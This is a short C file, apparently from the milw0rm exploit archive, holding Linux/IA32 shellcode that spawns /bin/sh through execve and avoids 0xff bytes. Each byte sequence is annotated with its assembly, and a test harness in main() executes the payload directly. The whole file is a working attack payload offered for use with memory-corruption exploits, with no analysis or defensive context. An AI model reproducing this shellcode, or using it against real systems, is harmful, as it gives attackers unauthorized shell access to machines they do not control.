/*

  0xff-less execve() /bin/sh by anathema <anathema@hack.co.za>

*/

#include <stdio.h>
#include <stdlib.h>

unsigned char code[] =

/* Linux/IA32 0xff-less execve() shellcode.  */

"\x89\xe6"                          /* movl %esp, %esi          */
"\x83\xc6\x30"                      /* addl $0x30, %esi         */
"\xb8\x2e\x62\x69\x6e"              /* movl $0x6e69622e, %eax   */
"\x40"                              /* incl %eax                */
"\x89\x06"                          /* movl %eax, (%esi)        */
"\xb8\x2e\x73\x68\x21"              /* movl $0x2168732e, %eax   */
"\x40"                              /* incl %eax                */
"\x89\x46\x04"                      /* movl %eax, 0x04(%esi)    */
"\x29\xc0"                          /* subl %eax, %eax          */
"\x88\x46\x07"                      /* movb %al, 0x07(%esi)     */
"\x89\x76\x08"                      /* movl %esi, 0x08(%esi)    */
"\x89\x46\x0c"                      /* movl %eax, 0x0c(%esi)    */
"\xb0\x0b"                          /* movb $0x0b, %al          */
"\x87\xf3"                          /* xchgl %esi, %ebx         */
"\x8d\x4b\x08"                      /* leal 0x08(%ebx), %ecx    */
"\x8d\x53\x0c"                      /* leal 0x0c(%ebx), %edx    */
"\xcd\x80"                          /* int $0x80                */
;

void main()
{
  void (*s)() = (void *)code;

  printf("Shellcode length: %d\nExecuting..\n\n",
      strlen(code));
  s();
}

// milw0rm.com [2004-09-26]